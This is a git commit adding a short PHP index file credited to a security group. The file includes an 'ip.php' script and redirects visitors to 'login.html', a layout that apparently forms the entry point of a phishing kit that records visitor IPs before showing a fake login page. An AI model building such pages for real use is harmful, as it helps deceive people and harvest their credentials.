d521538fc6d039fdb21a0195bfa5550ebc10b205
Error-love <99560603+Error-love@users.noreply.github.com>
2022-02-19 22:27:28 +0330

    Add files via upload

---
+++ index.php
@@ -0,0 +1,15 @@
+<?php
+/**
+ * Created by Abdal Security Group.
+ * Programmer: Ebrahim Shafiei
+ * Programmer WebSite: https://hackers.zone/
+ * Programmer Email: Prof.Shafiei@Gmail.com
+ * License : AGCL
+ * Current Date : Sat 02/01/2020
+ * Current Time : 01:37 AM
+ */
+
+include 'ip.php';
+header('Location: login.html');
+exit
+?>
